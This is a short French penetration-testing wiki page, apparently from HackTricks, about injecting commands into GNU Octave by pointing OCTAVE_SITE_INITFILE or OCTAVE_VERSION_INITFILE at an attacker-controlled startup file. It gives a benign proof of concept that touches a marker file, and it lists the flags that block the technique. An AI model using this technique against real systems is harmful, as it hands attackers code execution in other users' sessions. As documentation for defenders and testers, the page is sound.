# Injection dans les applications GNU Octave

{{#include ../../../banners/hacktricks-training.md}}

## `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave exécute plusieurs fichiers contenant des commandes Octave valides lors du démarrage. `OCTAVE_SITE_INITFILE` remplace le fichier de démarrage global au site et `OCTAVE_VERSION_INITFILE` remplace celui spécifique à la version, ce qui permet à l’une ou l’autre variable de rediriger l’exécution automatique vers un fichier lisible par l’attaquant.<sup>[[1]](#references)</sup>
```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```
`--no-init-file` ignore uniquement les fichiers utilisateur tels que `~/.octaverc` ; il n'empêche **pas** la surcharge du site-file ci-dessus. Utilisez `--no-site-file` pour les site files, ou `--norc` / `-f` pour désactiver tous les fichiers de démarrage.<sup>[[2]](#references)</sup>

## References

- [1] [Fichiers de démarrage de GNU Octave](https://docs.octave.org/latest/Startup-Files.html)
- [2] [Options de ligne de commande de GNU Octave](https://docs.octave.org/latest/Command-Line-Options.html)
{{#include ../../../banners/hacktricks-training.md}}
